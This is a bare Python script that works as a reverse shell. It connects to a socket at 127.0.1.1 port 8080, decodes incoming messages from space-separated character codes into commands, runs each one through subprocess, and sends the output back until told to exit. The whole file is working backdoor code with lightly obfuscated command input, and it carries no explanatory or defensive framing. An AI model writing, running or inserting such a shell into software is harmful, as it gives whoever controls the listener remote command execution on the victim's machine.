import sys, subprocess, socket
H = '127.0.1.1'
P = 8080
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((H, P))
while True:
    d = s.recv(1024).decode()
    if d.strip() == "exit":break
    c = "".join([chr(int(x)) for x in d.split()])
    o = subprocess.getoutput(c)
    s.send(o.encode())
s.close()
